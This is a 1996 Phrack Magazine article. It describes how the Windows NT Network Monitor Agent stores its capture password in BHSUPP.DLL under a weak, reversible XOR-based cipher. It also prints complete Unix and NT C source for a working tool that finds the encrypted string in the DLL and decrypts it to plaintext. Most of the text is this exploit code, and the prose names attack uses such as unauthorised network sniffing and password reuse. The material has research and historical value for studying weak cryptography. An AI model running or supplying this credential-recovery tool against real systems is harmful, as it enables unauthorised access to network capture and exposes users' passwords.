@@ -1,0 +1,635 @@
+                      	   ==Phrack Magazine==
+
+             Volume Seven, Issue Forty-Eight, File 15 of 18
+
+
+		Windows NT Network Monitor Exploitation
+
+		         NetMon Encryption Hammer
+			
+   		    	  by the AON and Route 
+			   for Phrack Magazine
+		     May 1996 Guild productions, kid
+
+		     comments to daemon9@netcom.com
+
+	   Full exploit including binary dll's and execuatables:
+    ftp.infonexus.com/pub/TooldOfTheTrade/Windows/NT/netMonExploit.tgz 
+
+
+	[The intro]
+
+	The Microsoft Network Monitor is a packet sniffer that runs under NT.  
+It is a very robust and versatile packet sniffer, offering much more then
+simple ethernet frame capturing.  It packs a robust capture/display filter
+language, powerful protocol parsers, and one snappy GUI.  NetMon is 
+delivered as part of the SMS package.  The user portion of the program 
+calls upon the services of the Network Monitor Agent, which is a kernel driver
+that ships with NT (3.5.x for sure, but I don't know about 3.1).  The Network 
+Monitor Agent also provides an interface for a remote machine to connect and 
+capture local data, provided it passes authentication. To restrict access, 
+Network Monitor Agent utilizes a password authentication scheme.  Access has 
+two tiers: priviledge to view previously captured sessions, and priviledge to 
+actually use the sniffer to place the ethernet card in promiscuous mode.  The 
+acutal encrypted password is stored as a 32-byte binary string in a 
+dynamically linked library file called BHSUPP.DLL.  We have written code to 
+extract this password from the dll and decyrpt it; we have broken the 
+Microsoft Network Monitor password authentication system.
+
+
+	[The low-down]
+
+	The encrypted string is kept as binary data in: 
+%SystemRoot%\system32\BHSUPP.DLL (in a default installation at least). 
+BHSUPP.DLL is known to be different sizes between versions, so we cannot look 
+for the encrypted string at a specific offset each time.  Instead we must 
+search for a flag, and seek 32-bytes past this flag.  The flag is the 16-byte
+string: "RTSS&G--BEGIN--".  (As a matter of note, there is a terminating 
+footer also: "RTSS&G--END--".)
+
+
+	[The encrypted truth]
+
+	It is a simple encryption function, that takes random length string 
+and returns 256-bit encrypted output.  It may appear to be a hash, rather 
+than a block cipher, but it is not.  It does take a random length input,
+and produce a fixed output, but the input is always padded to 32-bytes
+(with nulls if necessary).  The input to the function is a user defined
+arbitrary string.  The input is truncated to 16 bytes and then to pad 
+out the array, the whole original password string is concatenated  on the 
+truncated version, starting at the 16th byte.  It doesn't matter if the
+resulting string is longer than 32 bytes, as the cipher ignores anything
+past the 32nd byte.  So: "loveKillsTheDemon" becomes: "loveKillsTheDemo" 
+and then: "loveKillsTheDemoloveKillsTheDemon".  If your password is  
+smaller than 16  bytes, we get the 'hole-in-password' phenomena.  Since 
+the array is intialized will nulls, and the password is still folded over to 
+the 16th byte, these nulls remain.  This is easily visible from the first line
+of output in our exploit code.  It also accepts empty password strings 
+readily, without choking, which all Microsoft products seem willing to do all 
+to easily.
+
+	[The algorithm]
+
+	The 32-byte string is put through 32 rounds of identical operations.
+The outer for loop controls the value of the byte to be XORed with the
+entire array that round (except for itself, see below).  The inner loop steps
+through the entire byte array.  Each byte is permuted a total of 31 times 
+(The discrepency comes from the test case where i must not be equal to j in 
+order for a character to be permuted.  It would make no sense to XOR a byte 
+with itself).  So, there are a total of 992 operations.  The actual 
+encryption algorithm is quite simple:
+
+In C:			if(i!=j)mix[j]^=mix[i]+(i^j)+j;
+
+In English:		if i is NOT equal to j, the j indexed char of mix is 
+			assigned the value of the j indexed char of mix XORed 
+			with the i indexed char of mix PLUS i XORed with j 
+			PLUS j.
+
+Mathematically:		1) i ^ j = k
+			2) k + j = l
+			3) l + mix[i] = m
+			4) m ^ mix[j] = x
+
+			OR
+
+			((i ^ j) + j + mix[i]) ^ mix[j] = x 
+
+
+	The methods used for obscurity are exclusive OR (XOR) and binary 
+addition, (see the appendix if you are umfamiliar with these bitwise 
+operations) with completely known vectors.  The only unknown in the whole 
+equation is the user entered password, fleshed out to 32-bytes.  These 32
+bytes are taken through 32 rounds of permutations.  Simple and concise, 
+with no key material dropped, this algorithm is not lossy.  Since it is not 
+lossy it is 100% reversible, both in theory and practice.  In fact, since we 
+know the values of the counters i and j, throughout the entire encryption 
+process, decryption is simply a matter of reproducing these values in the 
+proper order.  Since the output of the encryption process is the input, 
+taken through 32 rounds of identical permutations, with known vectors, 
+we simply need to reverse this process.
+
+	[The code]
+
+	There are two versions of the exploit available.  A Windows NT version
+and, for those of you without access to an expensive NT-native compiler, 
+there is a Unix version as well.  The NT version is a console-based app, as
+GUI code would be a waste of time.  The full package of this exploit, along
+with an NT exexcutable and sample DLL's is available from:
+    ftp.infonexus.com/pub/ToolsOfTheTrade/Windows/NT/netMonExploit.tgz 
+
+
+	[The discussion]
+
+	The ramifications of this weak encryption in Network Monitor Agent are 
+many.  First off, the developers of Network Monitor Agent *didn't* use the 
+standard security mechanisms of Windows NT.  This may be because the driver is
+a kernel mode driver, and in NT the kernel is a trusted enity, therefore 
+the standard security API (of Win32) does not apply in the kernel making it 
+harder to do user authentication.  It also appears that they were trying to 
+achieve a mechanism based not on priviledge, but on knowledge.  It is very 
+likely that in secured environment not all administrators should be able to 
+sniff the network.  The problem is they did a *poor* job of securing a 
+powerful utility.
+	The most straight forward attack is use Network Monitor to sniff the 
+network (where you weren't suppose to be able to) for priviledged user data or
+passwords in a heterogeneous environment (since native NT networking does not 
+send password information in the clear, but standard TCP traffic from Unix
+is sent clear).  The rest of the attacks would come from shabby administration
+, such as the administrator used the password for the admin account and the 
+capture password in Network Monitor Agent (stupid, but likely) or the 
+same password for Network Monitor Agent on all machines across the network.
+	In order to use the exploit utility, one must have read priviledge for 
+BHSUPP.DLL which is installed into %SystemRoot%\system32 by default.  This 
+is not a remote attack, but rather a stepping stone to gain priviledged 
+information when one is under-priviledged.
+
+	[The moral]
+
+	Time and time again we see either shody implementations of trusted
+algorithms, or, like in this case, just plain bad cryptography.  Under ITAR,
+most secure cryptographic algorithms are classified as munitions, and are not
+exportable from this country.  The funny thing is, under current law, one-way
+hashing functions are *not* restricted (that is why all Unix variants can ship
+with the standard crypt(3) libraries and executables).  This authentication
+scheme could have *easily* been replaced by MD5, the same one-way hash used
+by PGP.  At least then, the complexity of an attack would be increased to
+a brute-force known-plaintext sweep of key values...
+
+
+
+	[The appendix]
+
+	For the binary-declined...
+
+Exclusive OR
+
+The XOR operation is a bitwise operation with the following truth table:
+
+	XOR| 1 | 0 |		The Exclusive OR operation simply says:
+	-------------		"...Hmmm, if I have a 1 and a 0, I'll spit
+	1  | 0 | 1 | 		out a 1.  Anything else, a 0..."
+	-------------
+	0  | 1 | 0 |
+
+
+Binary addition
+
+Binary addition is analogous to base10 addition.  However, each place holds
+2^n instead of 10^n...
+
+	add| 1 | 0 | 		base10:		base2:
+	-------------		    11            1011
+	1  |1 0| 1 | 		   + 5          + 0101
+	-------------              ---          ------
+	0  | 1 | 0 |                16		 10000
+
+
+
+
+This exploit made possbile by a grant from the Guild corporation.
+
+- May 07, 1996 route/aon
+
+
+	[The Sourcecode]
+	[Unix Version]
+
+/*
+
+Network Monitor Exploitation code, Unix version
+coded by daemon9
+The Guild, 1996
+
+*/
+
+
+#include<string.h>
+#include<stdio.h>
+#include<fcntl.h>
+
+#define fbufsize 	8192
+#define flag 		"RTSS&G--BEGIN--"
+#define VERSION		"Unix version\n"
+#define BUFSIZE 	48
+#define DLLNAME 	"./BHSUPP.DLL"
+
+int main()
+{
+	char *swirl(char *,int);
+	char *recover(char *);
+	void hexonx(char *);
+
+	char werd[]={"\n\n\n\n.this code made possible by a grant from the Guild corporation.\n\0"};
+	char *plain,*tmp,*fname,*encrypted;
+	int c;
+
+	printf(werd);
+	printf("\nNetMon Password Decryption Engine ");
+	printf(VERSION);
+	printf("\t1.\t\tEncrypt a plaintext password from STDIN.\n");
+	printf("\t2.\t\tDecrypt a plaintext password from the dll.\n");
+	tmp=(char *)malloc(10); 	/* Can't switch getchar() as it locks the */
+	bzero(tmp,10); 			/* fucking stream and makes futher I/O buggy*/
+	switch(atoi(gets(tmp))){
+		case 1:
+			printf("Enter password to be encrypted (note echo is on, as it would be a moot point\nto turn it off)\n->");
+			plain=(char *)malloc(BUFSIZE);
+			bzero(plain,sizeof(BUFSIZE)); 
+			gets(plain); 
+			hexonx(swirl(plain,0));
+			break;
+		case 2:
+			printf("Enter name and path of DLL [./BHSUPP.DLL]:");
+			fname=(char *)malloc(BUFSIZE);
+			bzero(fname,sizeof(BUFSIZE));
+			gets(fname);
+			if(fname[0]==0)strcpy(fname,DLLNAME);
+			if(!(encrypted=recover(fname))){
+				printf("Could not locate flag\n");
+				exit(1);
+			}
+			hexonx(swirl(encrypted,1));			
+			break;
+		default:
+			printf("\nFine.\n");
+			exit(0);
+	}
+	return 0;	
+}
+
+/*
+swirl is the encryption/decryption function.  It takes an arbitrary length
+string and, depending on the value of the mode variable, encrypts it or
+decrypts it.  It returns a pointer to the string.
+*/
+
+char *swirl(byteStr,mode)
+char *byteStr;
+int mode;
+{
+	int i=0,j=0;
+	char *mix,roundAndround[32][32];
+	void hexonx(char *);
+
+	mix=(char *)malloc(sizeof(byteStr));
+
+
+	if(!mode){
+		memset(mix,0,32);			/* set 32 bytes of memory to 0 */
+		strncpy(mix,byteStr,16);          	/* copy the first 16 bytes of the password into the mix*/
+		memcpy(&mix[16],byteStr,strlen(byteStr));   /* copy password into the 16th char of the mix; if mix and plain overlap, problems occur */
+
+		printf("Password upon entering encryption rounds:\n");
+		hexonx(mix);
+		printf("\n\nbeginning 32 rounds of 'encryption'\n");
+		for(i=0;i<32;i++)for(j=0;j<32;j++)if(i!=j){
+			mix[j]^=mix[i]+(i^j)+j;			/* Sekret Enkripsion occurs here... */
+			memcpy(&roundAndround[i][0],mix,32);	/* save a copy of each round */
+						  }
+		printf("\nDo you wish to view the encryption process round by round?[y]");
+		switch(toupper(getchar())){
+			case 'N':
+				break;
+			case 'Y':
+			default:
+			for(i=0;i<32;i++){
+				printf("round %d:\n",i+1);     	/* print the rounds out in hex */
+				hexonx(&roundAndround[i][0]);
+				getc(stdin);
+			}
+		}
+		printf("\nEncrypted output:\n");
+		return(mix);
+	}
+	if(mode){
+		strncpy(mix,byteStr,32);
+		for(i=31;i>=0;i--)for(j=31;j>=0;j--)if(i!=j)mix[j]^=mix[i]+(i^j)+j;
+		mix[32]=0;		
+		printf("\n\n\nThe plaintext is: %s\nIn hex:\n",mix);
+		return(mix);
+	}
+}
+
+/* 
+hexonx simply prints out 32 bytes of hexidecimal characters.
+*/
+
+void hexonx(byteStr)
+char *byteStr;
+{
+	int i=0;
+	for(;i<32;i++)printf("0x%x ",byteStr[i]);
+	printf("\n");
+}
+
+
+/*
+recover attempts to read the encrypted string from the dll 
+*/
+
+char *recover(fname)
+char *fname;
+{
+
+	char buffer[fbufsize],*pass;
+	int fd,i=0,j=0,demonFlag=0,offset,bufOffset=0;
+
+	if((fd=open(fname,O_RDONLY))<=0){
+		fprintf(stderr,"Cannot open %s\n",fname);
+		exit(1);
+	}
+	while(read(fd,buffer,8192)){
+		i=0;
+		while(i<fbufsize&&!demonFlag){
+				switch(buffer[i-4]){
+					case 'R':
+						if(buffer[i-3]=='T'&&buffer[i-2]=='S'&&buffer[i-1]=='S'&&buffer[i+1]=='G'&&buffer[i+2]=='-'&&buffer[i+3]=='-'&&buffer[i+4]=='B'&&buffer[i+5]=='E'&&buffer[i+6]=='G'&&buffer[i+7]=='I'&&buffer[i+8]=='N'&&buffer[i+9]=='-'&&buffer[i+10]=='-'){
+							demonFlag++;
+							bufOffset=i;
+	/* Password is 32 bytes past end of header */	offset=j-4;
+							printf("Encrypted Token Flag: '%s' located at offset 0x%x\n",flag,offset);
+							printf("Encrypted password should be located at offset 0x%x\n",offset+48);
+						}
+						break;
+					default:
+				}
+		i++;
+		j++;
+		}		
+	if(demonFlag)break;
+	}
+	if(!offset)return(0);
+	pass=(char *)malloc(BUFSIZE);
+	bzero(pass,32);
+	memcpy(pass,&buffer[bufOffset-4+48],32);
+	
+	printf("\nDo you wish to view the encrypted password?[y]");
+		switch(toupper(getchar())){
+			case 'N':
+				break;
+			case 'Y':
+			default:
+				hexonx(pass);
+				getc(stdin);
+		}
+	return(pass);
+}
+
+
+	[The Sourcecode]
+	[NT Version]
+
+
+
+//	A Guild Production  1996  //
+//	Constructed by AON  //
+
+#define STRICT
+#define MAX_FILE_SIZE 24576						//if BHSUPP.DLL grows, so must this
+			
+#include <windows.h>
+#include <stdio.h>
+
+void DecryptPassword(LPBYTE lpEncryptedPassword, LPSTR lpszPlaintextPassword);
+BOOL GetEncryptedPassword(HANDLE hTargetFile, LPBYTE lpEncryptedPassword);
+void GetTargetFileFromUser(HANDLE* phTargetFile, LPSTR lpszTargetFile);
+
+HANDLE g_hStdIn, g_hStdOut;						//global declaration of StandardIN and OUT
+
+
+//	This is a console app.  ReadFile and WriteFile used throughout so StdIN and StdOUT
+//  can be redirected.
+
+void main(int argc, char* argv[])			
+{
+	HANDLE hTargetFile;						
+	BYTE lpEncryptedPassword[32];		
+	char lpszPlaintextPassword[17] = {0};
+	char lpszOutputBuffer[80];
+	char lpszTargetFile[MAX_PATH] = {0};
+	char lpszUsage[] = "\nUsage: NMCrack [path to BHSUPP.DLL including filename]\n";
+	LPTSTR lpszSystemDirectory = NULL;
+	UINT nCount, nCount2;
+	
+	//set global handles
+	
+	g_hStdIn = GetStdHandle(STD_INPUT_HANDLE);	
+	g_hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);
+
+	//check for standard NT help switch
+	
+	if(argc > 1 && argv[1][0] == '/' && argv[1][1] == '?')
+	{
+		//display usage info
+		
+		WriteFile(g_hStdOut, lpszUsage, sizeof(lpszUsage), &nCount, NULL);
+			
+		//exit with success
+		
+		ExitProcess(0L);
+	}
+	
+	//if path and file name not specified on commandline try system directory first, because
+	//BHSUPP.DLL is probably there
+	if(argc == 1)
+	{
+		//findout how long path is for mem alloc
+		nCount = GetSystemDirectory(lpszSystemDirectory, 0);	
+															
+		//do alloc of that size
+		lpszSystemDirectory = malloc(nCount);		
+	
+		if(lpszSystemDirectory == NULL)
+		{
+			WriteFile(g_hStdOut, "Memory Allocation Failure - Terminating\n", 
+					  41, &nCount, NULL);
+
+			ExitProcess(1L);
+		}
+
+		//get system dir
+		GetSystemDirectory(lpszSystemDirectory, nCount);		
+	
+		//append file name to system directory
+		sprintf(lpszTargetFile, "%s\\bhsupp.dll", lpszSystemDirectory);
+		
+		//release memory
+		free(lpszSystemDirectory);
+	}
+	
+	else
+	{
+		//get the commandline input
+		strcpy(lpszTargetFile, argv[1]);
+	}
+
+	//try to open BHSUPP.DLL in the system dir or where the user instructed
+	hTargetFile = CreateFile(lpszTargetFile, GENERIC_READ, FILE_SHARE_READ | 
+							 FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
+							 FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+
+	//if not on the commandline or in the system dir ask user for path
+	if(hTargetFile == INVALID_HANDLE_VALUE && argc == 1)
+	{
+		GetTargetFileFromUser(&hTargetFile, lpszTargetFile);
+	}
+	
+	//user gave bad path or they don't have read permission on the file
+	else if(hTargetFile == INVALID_HANDLE_VALUE)
+	{
+		//make error string because file open failed
+		nCount2 = sprintf(lpszOutputBuffer, "\nUnable to open %s\n", lpszTargetFile);
+
+		//write out
+		WriteFile(g_hStdOut, lpszOutputBuffer, nCount2, &nCount, NULL);
+	
+		//exit with failure
+		ExitProcess(1L);
+	}
+
+	//retrieve the encrypted password from BHSUPP.DLL
+	if(!GetEncryptedPassword(hTargetFile, lpEncryptedPassword))
+	{
+		WriteFile(g_hStdOut, "Unable to retrieve encrypted password\n",
+				  39, &nCount, NULL);
+
+		ExitProcess(1L);
+	}
+
+	//cleanup handle
+	CloseHandle(hTargetFile);
+
+	//do the decryption here
+	DecryptPassword(lpEncryptedPassword, lpszPlaintextPassword);
+
+	//prepare for and print out results
+	nCount2 = sprintf(lpszOutputBuffer, 
+					  "\nThe Network Monitor Agent capture password is %s\n",
+					  lpszPlaintextPassword);
+
+	WriteFile(g_hStdOut, lpszOutputBuffer, nCount2, &nCount, NULL);
+
+	//close StandardIN and StandardOUT handles
+	CloseHandle(g_hStdIn);
+
+	CloseHandle(g_hStdOut);
+
+	//exit with success
+	ExitProcess(0L);
+}
+
+
+//Ah yeah, here it is.
+void DecryptPassword(LPBYTE lpEncryptedPassword, LPSTR lpszPlaintextPassword)
+{
+    register int outer, inner;
+
+    //go backwards through loops to undo XOR
+	for ( outer = 31; outer >= 0; outer-- )
+    {
+        for ( inner = 31; inner >= 0; inner-- )
+        {
+            if ( outer != inner )
+            {
+				lpEncryptedPassword[inner] ^= lpEncryptedPassword[outer] + 
+											  (outer ^ inner) + inner;
+            }
+        }
+    }
+
+    //since the original password was folded to fill 32 bytes only copy the first 16 bytes
+	memcpy(lpszPlaintextPassword, lpEncryptedPassword, 16);
+
+	//zero terminate this baby just incase it is actually a 16 byte password (yeah, right!)
+	lpszPlaintextPassword[16] = 0L;
+
+	return;
+}
+
+
+//	get the path and file name for BHSUPP.DLL from the user in the case that it was
+//  a custom install
+void GetTargetFileFromUser(HANDLE* phTargetFile, LPSTR lpszTargetFile)
+{
+	char lpszPrompt[] = "\nFull path to BHSUPP.DLL including file name: ";
+	UINT nCount;
+
+	WriteFile(g_hStdOut, lpszPrompt, sizeof(lpszPrompt), &nCount, NULL);
+
+	ReadFile(g_hStdIn, lpszTargetFile, MAX_PATH, &nCount, NULL);
+
+	//I had to account for the CR + LF that ReadFile counts in the nCount return value,
+	//so I can zero terminate this string.
+	lpszTargetFile[nCount - 2] = 0L;
+	
+	*phTargetFile = CreateFile(lpszTargetFile, GENERIC_READ, FILE_SHARE_READ | 
+							 FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 
+							 FILE_FLAG_SEQUENTIAL_SCAN, NULL);
+
+	//too lazy to make the error message report the actual path and file name tried 
+	if(*phTargetFile == INVALID_HANDLE_VALUE)
+	{
+		WriteFile(g_hStdOut, "Unable to open BHSUPP.DLL\n",
+				  26, &nCount, NULL);
+
+		ExitProcess(1L);
+	}
+}
+
+
+//	This function allocs one big buffer and reads the whole damn DLL into it.
+//	There is a flag string that marks the start of the section that contains the 
+//	encrypted passwords (in the case that there is a display password too), so
+//	we search for the first and last characters in the string.  If we hit on a match
+//	we check about 50% of the chars in the string for a match.  This is a good
+//	enough check based looking at the data.  I guess I could optimize memory usage 
+//  here too, but 24K is not very much these days, so fuck it.
+BOOL GetEncryptedPassword(HANDLE hTargetFile, LPBYTE lpEncryptedPassword)				   
+{
+	LPBYTE lpSearchBuffer;
+	UINT nCount, i;
+
+	//do the big buffer alloc
+	lpSearchBuffer = malloc(MAX_FILE_SIZE);
+
+	if(lpSearchBuffer == NULL)
+	{
+		WriteFile(g_hStdOut, "Memory Allocation Failure - Terminating\n", 
+				  41, &nCount, NULL);
+
+		ExitProcess(1L);
+	}
+
+	//read in the entire file.  It is small enough that this takes trivial time to complete.
+	ReadFile(hTargetFile, lpSearchBuffer, MAX_FILE_SIZE, &nCount, NULL);
+ 
+	//do search for RTSS&G--BEGIN--  When it is found move 48 bytes past the R and copy
+	//the encrypted password into the workspace
+	for(i=0; i<nCount; i++)
+	{
+		if(lpSearchBuffer[i] == 'R' && lpSearchBuffer[i+14] == '-')
+		{
+			if(lpSearchBuffer[i+1] == 'T' && lpSearchBuffer[i+2] == 'S' &&
+			   lpSearchBuffer[i+3] == 'S' && lpSearchBuffer[i+4] == '&' &&
+			   lpSearchBuffer[i+8] == 'B')
+			{
+				//found password and coping it into the workspace
+				memcpy(lpEncryptedPassword, &lpSearchBuffer[i+48], 32);
+				
+				//cleanup the mem alloc
+				free(lpSearchBuffer);
+
+				//return with success
+				return TRUE;
+			}
+		}
+	}
+
+	//cleanup
+	free(lpSearchBuffer);
+	
+	//it failed to find the marker string
+	return FALSE;
+}
+
